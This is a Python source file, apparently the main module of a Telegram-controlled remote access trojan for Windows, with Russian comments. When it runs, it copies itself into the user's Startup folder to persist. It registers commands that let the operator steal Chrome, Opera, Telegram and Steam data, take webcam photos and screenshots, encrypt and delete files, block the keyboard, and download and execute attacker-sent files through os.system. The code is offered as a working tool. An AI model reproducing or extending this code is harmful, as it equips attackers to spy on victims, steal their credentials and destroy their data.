# # # # # # # # # # # # # # # # # # # # # # #
#                                           #
#         by BeanD [t.me/PearDe]            #
#                                           #
# # # # # # # # # # # # # # # # # # # # # # #

# ---- Imports ---- #
from aiogram import Bot, Dispatcher, executor, types # Базовые импорты iogram
from aiogram.types.message import ContentType # Импорт для использования ContentTypes
from config import * # Импортируем id пользователя | token бота
from keyboards.main import * # Импортируем клавиатуры
from functions.System import * # Импортируем функционал
from functions.index import * # Импортируем функционал
from logs.chrome import * # Импортируем логи хрома
from logs.opera import * # Импортируем логи оперы
from logs.telegram import * # Импортируем логи телеграма
from logs.steam import * # Импортируем логи стима
# ---- Imports ---- #

bot = Bot(token=token) # Переменная bot которая содержит в себе токен бота
storage = MemoryStorage() # Машина состояний
dp = Dispatcher(bot, storage=storage) # https://docs.aiogram.dev/en/latest/dispatcher/index.html

Thisfile = sys.argv[0] # Список аргументов командной строки
Thisfile_name = os.path.basename(Thisfile) # Функция basename() возвращает базовое имя пути
user_path = os.path.expanduser('~') # Инициализация домашней директории пользователя

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"): # Если нету пути
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"') # Скопировать

while True: # Цикл
    try: # Попробовать
        @dp.message_handler(commands=['start']) # Команда /start
        async def process_start_command(message: types.Message): # Асинхронная функция
            if message.from_user.id == admin_id: # проверка на админа
                await bot.send_message(message.from_user.id, "Вы можете воспользоваться кнопками, если нужна помощь. Введите /help", reply_markup=buttons) # бот отправляет сообщение в случае успешной проверки


        # ---- Инициализация функционала ---- #
        Screen(dp, bot, admin_id)
        Antiviruses(dp, bot, admin_id)
        Pc_info(dp, bot, admin_id)
        VolumeON(dp, bot, admin_id)
        VolumeOFF(dp, bot, admin_id)
        Shutdown(dp, bot, admin_id)
        Restart(dp, bot, admin_id)
        F4(dp, bot, admin_id)
        WinD(dp, bot, admin_id)
        GetDir(dp, bot, admin_id)
        ListDir(dp, bot, admin_id)
        Selfie(dp, bot, admin_id)
        Screamer(dp, bot, admin_id)
        Open_url(dp, bot, admin_id)
        MakeDir(dp, bot, admin_id)
        RmTree(dp, bot, admin_id)
        RmFile(dp, bot, admin_id)
        Rename(dp, bot, admin_id)
        Replace(dp, bot, admin_id)
        Msg(dp, bot, admin_id)
        Dwn(dp, bot, admin_id)
        Web(dp, bot, admin_id)
        Au(dp, bot, admin_id)
        Sys(dp, bot, admin_id)
        Mouse(dp, bot, admin_id)
        Wall(dp, bot, admin_id)
        ChangeDir(dp, bot, admin_id)
        Encrypt(dp, bot, admin_id)
        Decrypt(dp, bot, admin_id)
        BLkeyboard(dp, bot, admin_id)
        Get_size(dp, bot, admin_id)
        Telegram(dp, bot, admin_id)
        Chrome(dp, bot, admin_id)
        Opera(dp, bot, admin_id)
        Steam(dp, bot, admin_id)
        DWzip(dp, bot, admin_id)
        SeeEx(dp, bot, admin_id)
        ChEx(dp, bot, admin_id)
        ProcList(dp, bot, admin_id)
        ClosePG(dp, bot, admin_id)
        CloseTask(dp, bot, admin_id)
        SayHello(dp, bot, admin_id)
        Uninstall(dp, bot, admin_id)
        CMDBomb(dp, bot, admin_id)
        DVDOpen(dp, bot, admin_id)
        DVDClose(dp, bot, admin_id)
        Rotate(dp, bot, admin_id)
        WriteText(dp, bot, admin_id)
        # ---- Инициализация функционала ---- #

        @dp.message_handler(commands=['help']) # Команда /help
        async def process_start_command(message: types.Message): # Асинхронная функция
            if message.from_user.id == admin_id: # Опять же проверка на админа
                await bot.send_message(message.from_user.id, """<b>Прочти прежде чем использовать бота!!!</b>
<i>Если пропали кнопки, отправь боту /start либо /help
Функция блокировки клавиатуры работает криво после,
окончания блокировки клавиатуры, некоторые клавишы могу всё ещё не работать.</i>
""", reply_markup=buttons, parse_mode='HTML') # Бот отправляет сообщение
        
        @dp.message_handler(content_types=['document']) # Тип контента: document
        async def download(message: types.Message): # Асинхронная функция
            if message.from_user.id == admin_id: # Сноваа проверка на админа.
                try: # Попробовать 
                    msg = await bot.send_message(message.from_user.id, "Скачиваю...") # Отправка ботом сообщения
                    file_id = message.document.file_id # Сохранения в переменную file_id айди файла
                    file = await bot.get_file(file_id) # Получение ботом этот файл
                    file_path = file.file_path # Сохранение в переменную 'Загрузку' файла
                    await bot.download_file(file_path, message.document.file_name) # Бот загружает файл
                    await bot.edit_message_text('Успешно скачал ✅', admin_id, msg.message_id) # Сообщает об этом
                except Exception as e: # except
                    await bot.send_message(admin_id, e) # Отправляет сообщение

        @dp.message_handler(content_types=['voice']) # Тип контента: voice
        async def audio(message: types.Message): # async функция
            if message.from_user.id == admin_id: # ОПЯТЬ проверка на админа.
                try: # Попробовать
                    msg = await bot.send_message(message.from_user.id, "Сейчас запущу...") # Переменная которая содержит отправку сообщения
                    file_id = message.voice.file_id # Сохранения в переменную id файла
                    file = await bot.get_file(file_id) # Бот получает файл по его id
                    file_path = file.file_path # Сохранение в переменную 'Загрузку' файла
                    await bot.download_file(file_path, message.voice.file_unique_id + '.ogg') # Бот загружает файл с расширением .ogg
                    os.system(message.voice.file_unique_id + '.ogg') # ~^~
                    await bot.edit_message_text('Успешно запустил твоё голосовое сообщение ✅', admin_id, msg.message_id) # Сообщение об успехе
                except Exception as e: # except
                    await bot.send_message(admin_id, e) # Отправляет сообщение

        if __name__ == '__main__': # Гугл в помощь. Это основа всех основ :)
            executor.start_polling(dp, skip_updates = True) # Запуск Бота
    except: # except
        pass # ._.
# Наконец я закончил комментировать этот файл (*_*)